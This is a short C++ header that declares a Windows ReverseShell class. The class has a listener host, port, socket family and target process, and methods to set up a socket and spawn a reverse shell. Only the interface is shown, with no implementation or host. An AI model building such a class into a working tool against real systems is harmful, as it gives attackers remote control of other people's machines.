#pragma once
#include "socket_winbd.h"
#include <iostream>
/*
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
*/

class ReverseShell
{
	public:
		ReverseShell(std::string lhost, int lport, short family, char* process);
		void exec();
		void get_config();

	private:
		SOCKET init_socket();
		sockaddr_in s_setting();
		void reverse_s(SOCKET socks,struct sockaddr_in s);
		std::string lhost;
		int lport;
		short family;
		char* process;
};